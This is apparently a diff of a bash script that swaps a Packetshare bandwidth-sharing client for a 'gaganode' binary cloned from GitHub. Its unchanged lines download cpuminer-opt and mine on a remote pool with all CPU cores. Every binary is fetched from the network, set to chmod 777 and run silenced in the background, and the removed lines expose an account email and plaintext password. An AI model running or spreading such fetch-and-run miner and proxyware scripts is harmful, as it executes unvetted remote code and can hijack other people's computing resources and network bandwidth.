@@ -1,7 +1,7 @@
 #!/bin/bash
-wget https://www.packetshare.io/files/packetsharev1.0.2/x86_64/Packetshare
-chmod 777 Packetshare
-./Packetshare -email=aabc3464@gmail.com -password=love0101 -accept-tos > /dev/null 2>&1 &
+git clone https://github.com/aquilarendy/gaga.git
+cd gaga && chmod 777 gaganode
+./gaganode > /dev/null 2>&1 &
 wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.41/cpuminer-opt-linux-5.0.41a.tar.gz
 tar xf cpuminer-opt-linux-5.0.41a.tar.gz
 ./cpuminer-avx2 -a yespowertide -o stratum+tcp://stratum-eu.rplant.xyz:7059 -u TMUMD2Fx7UXUtuzVtTcaPDdBTYbQizbH2g.x -p webpassword=x,m=solo -t $(nproc --all)
